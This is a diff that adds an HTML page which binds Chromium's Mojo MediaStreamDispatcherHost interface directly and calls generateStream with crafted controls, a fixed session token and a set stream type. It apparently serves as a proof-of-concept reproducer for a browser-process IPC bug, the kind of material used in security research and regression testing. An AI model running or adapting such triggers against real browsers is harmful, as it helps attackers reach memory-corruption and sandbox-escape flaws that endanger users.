@@ -1,0 +1,23 @@
+<html>
+<head>
+<script src="mojo/mojo_bindings.js"></script>
+<script src="mojo/third_party/blink/public/mojom/mediastream/media_stream.mojom.js"></script>
+</head>
+<body>
+<script>
+
+
+    var media_stream = new blink.mojom.MediaStreamDispatcherHostPtr();
+    Mojo.bindInterface(blink.mojom.MediaStreamDispatcherHost.name, mojo.makeRequest(media_stream).handle);
+
+    var p0 = new blink.mojom.StreamControls();
+    var p1 = new blink.mojom.TrackControls(); p1.requested = true; p1.streamType = 9; p1.deviceId = "";
+    var p2 = new blink.mojom.TrackControls(); p2.requested = true; p2.streamType = 9; p2.deviceId = ""; p0.audio = p1; p0.video = p2; p0.hotwordEnabled = false; p0.disableLocalEcho = true; p0.requestPanTiltZoomPermission = false;
+    var p3 = new blink.mojom.StreamSelectionInfo();
+    var p4 = new mojoBase.mojom.UnguessableToken(); p4.high= 7773416083151151597; p4.low = 1586930174894638458; p3.strategy = 2; p3.sessionId = p4; 
+    media_stream.generateStream(111,p0,false,p3);
+            
+    setTimeout(()=>{window.close();},10000);
+</script>
+</body>
+</html>
